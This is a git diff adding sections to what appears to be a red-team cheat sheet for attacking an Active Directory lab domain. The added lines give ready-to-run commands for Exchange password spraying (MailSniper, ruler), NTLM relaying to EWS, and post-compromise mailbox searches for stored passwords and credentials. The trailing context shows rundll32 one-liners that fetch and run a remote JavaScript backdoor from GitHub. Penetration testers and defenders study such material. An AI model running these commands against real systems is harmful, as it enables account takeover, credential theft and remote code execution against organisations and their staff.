@@ -751,6 +751,64 @@ python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -
 
 
 
+#### [](#header-4) Exchange Password Spray
+
+```powershell
+#https://github.com/dafthack/MailSniper.git
+
+Invoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\users.txt -Password Winter2019
+
+
+#https://github.com/sensepost/ruler
+
+./ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v
+
+```
+
+
+
+#### [](#header-4) ExchangeRelayX 
+
+```powershell
+#https://github.com/quickbreach/ExchangeRelayX
+
+An NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers.
+
+
+./exchangeRelayx.py -t https://mail.quickbreach.com
+
+```
+
+
+
+#### [](#header-4) Exchange Mailbox Post-Compromise
+
+```powershell
+#https://github.com/dafthack/MailSniper.git
+
+Enumerate GlobalAddressList
+
+Get-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019
+
+Enumerate AD Usernames
+
+Get-ADUsernameFromEWS -Emaillist .\users.txt
+
+Enumerate Mailbox Folders
+
+Get-MailboxFolders -Mailbox jamie@m0chanAD.local
+
+Enumerate Passwords & Credentials Stored in Emails
+
+Invoke-SelfSearch -Mailbox jamie@m0chanAD.local
+
+Enumerate Passwords & Credentials (Any Users) Requires DA or Exchange Admin
+
+Invoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012
+```
+
+
+
 #### [](#header-4) CrackMapExec
 
 ```powershell
@@ -2286,3 +2344,4 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
 ```
+
